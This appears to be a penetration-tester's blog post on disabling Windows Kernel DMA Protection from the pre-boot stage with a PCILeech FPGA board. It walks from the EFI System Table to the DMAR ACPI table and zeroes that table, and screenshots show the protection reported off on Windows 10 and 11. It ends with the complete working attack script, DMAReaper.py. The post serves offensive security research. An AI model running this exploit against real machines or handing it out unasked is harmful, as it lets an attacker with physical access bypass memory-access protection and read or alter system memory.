---
layout: post
title: Neutralizing Kernel DMA Protection
date: '2025-08-11 10:00:00 -0600'
description: 'Research on pre-boot DMA attack methodology for disabling Kernel DMA protection on modern windows'
category:
- DMA
tags: [DMA, Pentest, Physical, Hardware]
mermaid: true
image:
  path : "/assets/img/philosophy/philosophy.PNG"
  src : "/assets/img/philosophy/philosophy.PNG"
---

The FirstStrike approach is to leave "DMA Protection" and "Intel VT-D" enabled in BIOS, opting only to disabled "Intel VT-X" or "Virtualization Technology" when these settings can be controlled.

The attack then injects a modified pcileech kernel module during preboot while detonates automatically from within ntoskernel.exe once the OS is loaded. This approach works despite OS level Kernel DMA protection being enabled. 

### Caveat
In some UEFI implementations however, Intel VT-X cannot be disabled while VT-D is enabled (the option is greyed out). 

Furthermore, the FirstStrike shellcode only works at this time against windows 10 targets. There is no public solution against Windows 11.

We need an alternative method to disable Kernel DMA protection for these circumstances.

### Initial Setup
Before we continue, lets check our windows target and make sure that Kernel DMA Protection is indeed enabled.

The documentation from microsoft states that we can check this in two places , MSINFO and "Device Security".


![[Pasted image 20250808142128.png]]

Ok, lets confirm those elements on our target laptop :

### Device Security

![[MemAccsesProtection.png]]

Looks good

### MSINFO32

![[MSINFO 1.png]]

Alright so Kernel DMA Protection is enabled at the OS Level. Perfect !

## Theory
Kernel DMA Protection has several *requirements* in order to function properly. We can perhaps attack some of these requirements in order to disable it.

From Microsoft Documentation on Kernel DMA Protection :


![[Pasted image 20250808115737.png]]


IOMMU is used. This makes sense, since we know IOMMU contains maps of physical to virtual memory each peripheral device is allowed to access.

So obvious requirements seem to be VT-x and VT-d enabled in firmware.
This is evident from Microsoft documented instruction for enabling Kernel DMA Protection seen below : 

![[Pasted image 20250808120006.png]]

Alright, we already have a method of attacking the OS when we can disable VT-x (FirstStrike), so lets focus on VT-d. Crucially, in some UEFI implementation, VT-x cannot be disabled without turning off VT-d first, and turning off VT-d triggers BitLocker recovery. That wont work. We need to *leave the features on* and still manage to disable DMA protection.

Let's explore how VT-d works from the Intel Virtualization Technology for Directed I/O documentation :

![[Pasted image 20250808120337.png]]
So, the **IOMMU** works because VT-d reports the remapping data to the OS through this DMA Remapping Reporting (DMAR) ACPI table structure.

What is ACPI ? Advanced Configuration and Power Interface. Essentially tables used by Firmware to report capabilities and communicate functional data to the OS (think fans, backlights, etc.)

These are just "Structures" in memory. 

Ulf Frisk made a blog post in 2016 about how nulling the DMAR ACPI can disabled Virtualization Based Security.

While this is no longer the case in 2025, it may still impact Kernel DMA Protection, which is separate from VBS. We will set the DMAR ACPI table as our target. Ulf's blog post assumes that attackers already know the address of the DMAR ACPI (by booting into Linux from a USB and using dmesg to grab logs from the kernel at boot). This is an unreasonable requirement since most target computers will not allow us to control boot order or boot from USB. We will need to find the address ourselves.

On windows, there is no easy way to read this from the OS. There are tools we can use to *parse* ACPI tables, but we **cannot dereference the virtual address** exposed to the operating system. And if we want to interact with this structure, we will need the physical address.

In UEFI, virtual and physical memory are mapped 1:1, so the best approach to identifying the location of the DMAR ACPI table is to do so from pre-boot environment. While we cannot do this during a pentest, we CAN do it for our R&D in order to create the attack primitive, and work backwards with that information to find a valid search technique. Lets get started.

#### Installing UEFIShell

We can place a custom EFI program called UEFIShell into the boot partition of the windows system as shown below :

![[UEFIShell.png]]

Once this EFI program is in place, we can reboot and boot into the shell from UEFI menu. First we open the Boot Menu (F9)

![[Pasted image 20250808143719.png]]

We select boot from file

![[Pasted image 20250808143808.png]]

Select the right volume

![[Pasted image 20250808143932.png]]

And now we can navigate to S:/EFI/Microsoft/Boot where we placed our Shellx64.efi program earlier

![[Pasted image 20250808144029.png]]

Running this, we get our UEFI Shell. This is great because it runs as a program within the current UEFI environment, meaning data structures in memory are representative of the normal pre-boot environment. We can use the built-in acpiview command to read the DMAR table and get its physical address for our R&D :

![[Pasted image 20250808144238.png]]

Sweet, now we know what we are looking for, the DMAR ACPI is located at **0x57B64000**
### Finding the DMAR ACPI programmatically

So we can't exactly use acpiview from a DMA perspective, and booting UEFIShell only works in our lab environment because we intentionally disabled Secure Boot and have access to the Boot Menu in the first place. This wont work during a pentest. We need a way to derive the physical address of the DMAR ACPI table programmatically using only our pre-boot DMA capabilities.

#### Leechcore 

The PCILeech Framework includes a python library which acts as a wrapper around important basic functionality used to control the PCILeech firmware. We will leverage this to gain arbitrary READ/WRITE from python so that we can implement our own logic without the overhead of modifying the C language components of the PCILeech client or modules. 

![[Pasted image 20250808125227.png]]


We implement this library into a basic python program which will initialize the connection to our screamer board, and use the read(), read_scatter(), and write() functions to control the FPGA during pre-boot and obtain and modify important memory structures.
#### Starting from the EFI System Table

The EFI System table is the primary target for UEFI exploitation because it contains pointers to all the important functions and structures that an EFI program may require to run during pre-boot. This includes pointers to functions like BootServices and RuntimeServices, but also pointers to data structure as we will see.

Crucially, we can locate the EFI System Table by reading memory during pre-boot and flagging the IBI SYST hex pattern (`4942492953545359`). We will implement some basic logic in python to scan memory for this, and to eliminate false positives by checking for stuff like revision number and size.

The search for the table and resultant structure is seen here :

![[Pasted image 20250808125826.png]]

Now that we can reliably find the EFI System Table, we can get to its content!
#### Configuration Table

The UEFI 2.1 Standard describes the Configuration Table below :

![[Pasted image 20250808130205.png]]
The Table will contain GUID/Pointer pairs that we are interested in.
Crucially, the offsets of this structure from the EFI System Table Base address is **always the same**

So, we know that at `0x68` from the EFI Table base address, we will have the "Table Entries" value describing how many GUID/Pointer pairs exist, and

at `0x70` from the EFI Table base address, we will have a pointer to the Configuration Table data.

We see that in our dump of the System table below, at exactly offset `0x70` as expected

![[Pasted image 20250808130710.png]]

The Configuration Table Pointer in little Endian is **0x521B8000**

We can walk this table in python easily. The raw memory looks like this :

![[Pasted image 20250808130847.png]]

Again, according to the UEFI 2.1 Specs, this section contains GUID/Pointer pairs. The GUIDs are 16 Bytes long and the Pointers are 8 Bytes long making each entry 24 Bytes total. We can walk these programmatically in 24 byte chunks to parse them.

Once we find the right GUID, we will use its accompanying pointer to get to that entries VendorTable data structure.

From the documentation, common GUIDs are described

![[Pasted image 20250808131114.png]]

We want to find ACPI tables, so we are interested in the **EFI_ACPI_20_TABLE_GUID** value!

The doc shows the value as 
  `{0x8868e871,0xe4f1,0x11d3,\`
    `{0xbc,0x22,0x00,0x80,0xc7,0x3c,0x88,0x81}}`

In reality, the structure uses a mix of Little and Big Endian for its different parts. If we want to pattern match, we need to normalize the different endianness of this string.

The three parts before the slash are little endian and everything after the slash is big endian, leading to:

EFI_ACPI_20_TABLE_GUID = **71 E8 68 88 F1 E4 D3 11 BC 22 00 80 C7 3C 88 81**

We locate the accompanying pointer in the Configuration table dump as shown below :

![[Pasted image 20250808132933.png]]
#### ACPI 2.0 VendorTable

Now that we have the pointer to the ACPI VendorTable (**0x57BFE014**) we can read from that address. The objective is to find the **Root System Description Pointer** (RSDP) value, which points to the location of the **Root System Description Table** (RDST). 

We find the pointer precisely at the previously obtained address, reading 4 bytes backwards.

![[Pasted image 20250808134202.png]]
#### Root System Description Table

With the RSDP known, we can find the RSDT. This table contains pointers to all the ACPI tables currently installed in the firmware! We will parse them one by one and read the data at the locations they point to, searching for an entry starting with the DMAR signature in hex. (`444D4152`)

Among the entries is the same address we obtained earlier using the acpiview program (the address is relatively static across reboots).

![[Pasted image 20250808135228.png]]
We can confirm by parsing the memory at 0x57B64000 manually. We see the content of the DMAR ACPI table :

![[Pasted image 20250808135549.png]]

This is the physical address of our target !

#### DMAReaper.py

Now that we have the algorithm for finding the DMAR ACPI address, we can implement it in python leveraging the LeechCore library to control the FPGA.

The program will perform pre-boot DMA attack to identify the location of the DMAR ACPI table and overwrite it with 64 zeroes.

DMAReaper.py execution against Windows 11 24H2 is shown below. The program takes the following logical steps
1) Scan memory using scatter search in 100 x 4096 byte chunks (size of a page)
2) Find the EFI System Table Base address
3) Find the Configuration table using offset 0x70 from the EFI System Table Basse address
4) Parse each entry to find the ACPI 2.0 GUID
5) Find the paired ACPI 2.0 VendorTable pointer
6) Find the Root System Description Pointer in the ACPI 2.0 VendorTable
7) Find the Root System Description Table for ACPI 2.0
8) Read memory at each ACPI table pointer in RSDT
9) Identify the DMAR ACPI Table
10) Overwrite the DMAR ACPI Table with 64 zeroes

![[Pasted image 20250809194115.png]]

What happens if we boot now? 
#### Kernel DMA Protection Disabled

Windows 10 and Windows 11 will boot without complaining, but the DMAR ACPI table cannot be located since it was destroyed. This means that no IOMMU can be used, which means Kernel DMA Protection cannot be initialized!

We can verify this again by checking "Device Security" 

##### Windows 10 - Device Security

![[DMANuked1 1.png]]


##### Windows 11 - Device Security

![[DMANukewin11_1.png]]

**Memory Access Protection** is now *missing* from the Core Isolation features!!

Lets check MSINFO32 as before :
##### Windows 10 - MSINFO32

![[Pasted image 20250808145910.png]]
##### Windows 11 - MSINFO32

![[DMANukewin11_2.png]]

System information is reporting that **Kernel DMA Protection is OFF**

Virtualization-based security capabilities no longer reports DMA Protection as available.

Yet in the UEFI firmware configuration :
- DMA Protection is still enabled
- VT-x is still enabled
- VT-d is still enabled
- Secure Boot is enabled
- BIOS Sure Start is enabled
- Virtualization based BIOS protection is enabled
- Enhanced Firmware Runtime Intrusion Detection and Prevention is enabled

We have successfully demonstrated that pre-boot DMA attacks can bypass OS level DMA Countermeasures that depend on communication with firmware components.

Version 1 of the DMAReaper.py program is below :

```python

#!/usr/bin/env python3

# Created by Pierre-Nicolas Allard-Coutu 
# https://github.com/pn-tester/DMAReaper
# For use with PCILeech firmware via compatible FPGA device
# PCILeech Framework and LeechCore library created by : Ulf Frisk 

import sys
import struct
import leechcorepyc as leech

# ACPI 2.0 Table GUID in mixed-endian format (normalized)
ACPI20_GUID = bytes([
    0x71, 0xE8, 0x68, 0x88,
    0xF1, 0xE4,
    0xD3, 0x11,
    0xBC, 0x22, 0x00, 0x80, 0xC7, 0x3C, 0x88, 0x81
])

PAGE_SIZE = 0x1000
RAM_SIZE = 64 * 1024 * 1024 * 1024  # 64 GB
START_ADDR = 0x52000000
BATCH_SIZE = 100
EFI_SIG = b'IBI SYST'  # EFI System Table signature (big endian)

banner =r"""
 _____  _______ _______ ______                               
|     \|   |   |   _   |   __ \.-----.---.-.-----.-----.----.
|  --  |       |       |      <|  -__|  _  |  _  |  -__|   _|
|_____/|__|_|__|___|___|___|__||_____|___._|   __|_____|__|  
                                           |__|               
Created By : PN-TESTER
"""
try:
# Initialize LeechCore globally
    lc = leech.LeechCore("fpga")
except:
    print(banner)
    print("[-] Unable to initialize device")
    exit(0)

def hexdump(data, base=0):
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_bytes = ' '.join(f'{b:02X}' for b in chunk)
        ascii_repr = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f"{base+i:016X}  {hex_bytes:<48}  {ascii_repr}")

def extract_exit_boot_services(lc, efi_table_data, efi_table_addr):
    try:
        if len(efi_table_data) < 0x60:
            print(f"[!] EFI Table too small to parse at 0x{efi_table_addr:016X}")
            return None

        revision = struct.unpack_from("<I", efi_table_data, 0x20)[0]
        bs_ptr = struct.unpack_from("<Q", efi_table_data, 0x60)[0]

        if revision == 0 or bs_ptr == 0 or bs_ptr % 8 != 0:
            print(f"[!] Invalid EFI Table revision ({revision}) or BootServices pointer (0x{bs_ptr:016X}).")
            return None

        print(f"\n[+] EFI Table Revision: 0x{revision:08X}")
        print(f"[+] EFI_BOOT_SERVICES pointer: 0x{bs_ptr:016X}")

        bs_data = lc.read(bs_ptr, 0x100, True)
        if not bs_data or all(b == 0 for b in bs_data):
            print(f"[!] EFI_BOOT_SERVICES structure is empty or unreadable.")
            return None

        #print("\n[+] Dumping EFI_BOOT_SERVICES Structure (first 0x100 bytes):")
        #hexdump(bs_data, base=bs_ptr)

        exitboot_ptr = struct.unpack_from("<Q", bs_data, 0xE8)[0]
        if exitboot_ptr == 0:
            #print(f"[!] ExitBootServices() pointer is null.")
            return None

        #print(f"\n[+] ExitBootServices() function pointer: 0x{exitboot_ptr:016X}")
        return exitboot_ptr, bs_ptr

    except Exception as e:
        print(f"[!] Exception while parsing EFI structures: {e}")
        return None

def search_for_efi_table():
    addresses = list(range(START_ADDR, RAM_SIZE, PAGE_SIZE * BATCH_SIZE))
    found = False

    for base_addr in addresses:
        batch_addrs = [base_addr + i * PAGE_SIZE for i in range(BATCH_SIZE)]
        range_end = batch_addrs[-1] + PAGE_SIZE

        print(f"[*] Scanning range: 0x{base_addr:016X} - 0x{range_end:016X}")

        pages = lc.read_scatter(batch_addrs)

        for page in pages:
            addr = page['addr']
            data = page['data']
            if not data or len(data) < 0x60:
                continue

            if EFI_SIG in data:
                offset = data.find(EFI_SIG)
                abs_addr = addr + offset
                print(f"\n[+] EFI System Table Candidate found at 0x{abs_addr:016X}\n")
                hexdump(data[offset:offset+0x80], base=abs_addr)

                result = extract_exit_boot_services(lc, data[offset:], abs_addr)
                if result:
                    exitboot_ptr, bs_ptr = result
                    print("[+] Valid EFI System Table")
                    return abs_addr
                else:
                    print("[!] False positive â€” continuing search...\n")

    print("[!] EFI System Table not found in scanned memory.")
    return None

def read_bytes(addr: int, size: int) -> bytes:
    data = lc.read(addr, size, True)
    if not data or len(data) != size:
        raise IOError(f"Read {size} bytes at 0x{addr:016x} failed")
    return data

def read_u64(addr: int) -> int:
    return struct.unpack_from("<Q", read_bytes(addr, 8))[0]

def read_u32(addr: int) -> int:
    return struct.unpack_from("<I", read_bytes(addr, 4))[0]

def find_acpi_vendor_table(efi_system_table_addr: int):
    """Return VendorTable (RSDP) pointer if ACPI 2.0 GUID found."""
    boot_services_ptr = read_u64(efi_system_table_addr + 0x60)
    entries = read_u64(efi_system_table_addr + 0x68)
    cfg_tbl_ptr = read_u64(efi_system_table_addr + 0x70)

    #print(f"[+] BootServices pointer: 0x{boot_services_ptr:016x}")
    print(f"[+] Config table entries: {entries}")
    print(f"[+] Config table pointer: 0x{cfg_tbl_ptr:016x}")

    cur = cfg_tbl_ptr
    for i in range(entries):
        guid_bytes = read_bytes(cur, 16)
        if guid_bytes == ACPI20_GUID:
            vendor_table_ptr_32 = read_u32(cur + 16)
            vendor_table_ptr = vendor_table_ptr_32  # zero-extend 32-bit to 64-bit int
            print(f"[+] ACPI 2.0 GUID matched at entry {i}")
            print(f"[+] VendorTable pointer: 0x{vendor_table_ptr:08x}")
            return vendor_table_ptr
        cur += 24

    print("[-] ACPI 2.0 GUID not found in config table entries")
    return None

def find_dmar_from_rsdp(rsdp_addr: int):
    """Return DMAR table pointer if found via RSDP -> RSDT search."""
    # RSDT pointer is at offset 0x0C relative to RSDP base, so read at rsdp_addr - 4 per original asm
    rsdt_32 = read_u32(rsdp_addr - 4)
    rsdt_addr = rsdt_32  # zero-extend 32-bit physical address

    rsdt_len = read_u32(rsdt_addr + 4)
    print(f"[+] RSDT pointer: 0x{rsdt_addr:016x}, length = {rsdt_len}")

    if rsdt_len < 40:
        print("[-] RSDT length too small")
        return None

    entry_count = (rsdt_len - 40) // 4
    entry_base = rsdt_addr + 40

    for i in range(entry_count):
        subtable_ptr_32 = read_u32(entry_base + i * 4)
        subtable_ptr = subtable_ptr_32  # zero-extend

        sig = read_bytes(subtable_ptr, 4)
        try:
            sig_str = sig.decode('ascii', errors='ignore')
        except Exception:
            sig_str = ''

        if sig_str == 'DMAR':
            print(f"[+] DMAR table found at 0x{subtable_ptr:016x}")
            return subtable_ptr
        else:
            pass
            #print(f"    Entry {i}: 0x{subtable_ptr:016x} Signature={sig_str}")

    print("[-] DMAR table not found in RSDT")
    return None

def killDMARACPI(dmar_ptr):
    if dmar_ptr is None:
        print("[!] No DMAR pointer provided to overwrite function")
        return
    try:
        zero_bytes = b'\x00' * 64  # Adjust size as needed
        lc.write(dmar_ptr, zero_bytes)
        print("[+] Overwrite successful")
        print("[+] Kernel DMA Protection disabled")
    except Exception as e:
        print(f"[!] DMAR overwrite failure: {e}")

def main():
    print(banner)
    efi_system_table_addr = search_for_efi_table()
    if not efi_system_table_addr:
        print("[!] EFI System Table not found, aborting.")
        sys.exit(1)

    rsdp_ptr = find_acpi_vendor_table(efi_system_table_addr)
    if not rsdp_ptr:
        print("[!] ACPI 2.0 Vendor Table not found, aborting.")
        sys.exit(1)

    dmar_ptr = find_dmar_from_rsdp(rsdp_ptr)
    if not dmar_ptr:
        print("[!] DMAR Table not found, aborting.")
        sys.exit(1)

    killDMARACPI(dmar_ptr)

if __name__ == "__main__":
    main()

